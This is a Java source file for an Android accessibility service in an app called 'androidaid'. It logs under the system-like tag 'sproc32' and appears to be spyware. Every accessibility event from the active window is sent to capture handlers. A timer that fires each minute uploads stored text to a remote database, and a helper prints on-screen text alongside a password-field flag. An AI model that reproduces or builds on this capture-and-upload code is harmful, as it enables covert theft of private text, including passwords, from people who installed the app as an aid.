package androidaid.android.com.androidaid;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Rect;
import android.os.Parcelable;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.LinearLayout;

import java.io.File;

import androidaid.android.com.androidaid.core.StringKeeper;
import androidaid.android.com.androidaid.core.TextBuilder;
import androidaid.android.com.androidaid.networking.DatabaseNetworking;
import androidaid.android.com.androidaid.networking.InternetSpeed;
import androidaid.android.com.androidaid.program_flow.Constants;
import androidaid.android.com.androidaid.program_flow.Flags;
import androidaid.android.com.androidaid.storage.InternalStorageManager;
import androidaid.android.com.androidaid.storage.InternalStorageParser;
import androidaid.android.com.androidaid.utilities.StringUtils;
import androidaid.android.com.androidaid.utilities.SystemTools;

public class MainAccessService extends AccessibilityService {
    private static BroadcastReceiver timeChangedReceiver;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        System.out.println("[sproc32.MainAccessService]: Found an accessibility event.");
        System.out.println("[sproc32.MAS]: eventType = " + event.getEventType());
        //System.out.println("[sproc32.MAS]: eventClass =" + event.getClassName().toString());

        //check connection with firebase here
        if(InternetSpeed.isOnline()) {
            AccessibilityEventManager.handleOnlineAccessibilityEvent(event, getRootInActiveWindow());
        } else {
            AccessibilityEventManager.handleOfflineAccessibilityEvent(event, getRootInActiveWindow());
        }
    }

    @Override
    public void onInterrupt() {

    }

    @Override
    public void onServiceConnected() {
        System.out.println("[sproc32.MainAccessService]: Service is connected.");
        Flags.serviceStarted = true;

        registerTimeChangeReceiver();
    }

    /**
     * Registers the on time tick receiver (called every minute) to check for internal storage text and if it's needed to be sent
     * to the database.
     */
    private void registerTimeChangeReceiver() {
        timeChangedReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                //each minute, check if InternalStorageState has any lines to be read. If yes, parse them with InternalStorageParser and send them to the database.
                System.out.println("[sproc32.MAS]: Received a time tick event!");

                //if internal storage isn't empty, send data from internal storage to the database
                if (InternalStorageManager.checkInternalStorageStateEmpty() == false && InternetSpeed.isOnline()) {
                    System.out.println("[sproc32.MAS]: Internal storage isn't empty. Starting to check, read and send data from internal storage to the database!");
                    DatabaseNetworking.storeInternalStorageText(InternalStorageParser.parseInternalStorage());
                }
            }
        };

        System.out.println("[sproc32.MAS]: Registering time change receiver!");
        IntentFilter timeTickIF = new IntentFilter(Intent.ACTION_TIME_TICK);
        registerReceiver(timeChangedReceiver, timeTickIF);
        //todo: unregister receiver?

    }

    private void displayProperties(AccessibilityNodeInfo child) {
        //TODO: GET ALL OF THOSE VIEWS IN SOME SORT OF A FILE WITH THEIR SCREEN BOUNDS AND DRAW THEM IN AN IMAGE TO VISUALIZE THEM
        for(int i = 0; i<child.getChildCount(); i++) {
            System.out.println("[sproc32.MAS.ani]: Displaying properties of child " + i);

            System.out.println("        - [sproc32.MAS.ani]: childCount =" + child.getChildCount());
            System.out.println("        - [sproc32.MAS.ani]: className = " + child.getClass());
            System.out.println("        - [sproc32.MAS.ani]: packageName = " + child.getPackageName());
            System.out.println("        - [sproc32.MAS.ani]: text = " + child.getText());
            System.out.println("        - [sproc32.MAS.ani]: viewIdResourceName = " + child.getViewIdResourceName());
            System.out.println("        - [sproc32.MAS.ani]: isClickable = " + child.isClickable());
            System.out.println("        - [sproc32.MAS.ani]: isEditable = " + child.isEditable());
            System.out.println("        - [sproc32.MAS.ani]: isPasswordField = " + child.isPassword());
            System.out.println("        - [sproc32.MAS.ani]: isSelected = " + child.isSelected());

            if(child.getChildCount()!=0) {
                displayProperties(child);
            }
        }
    }
}
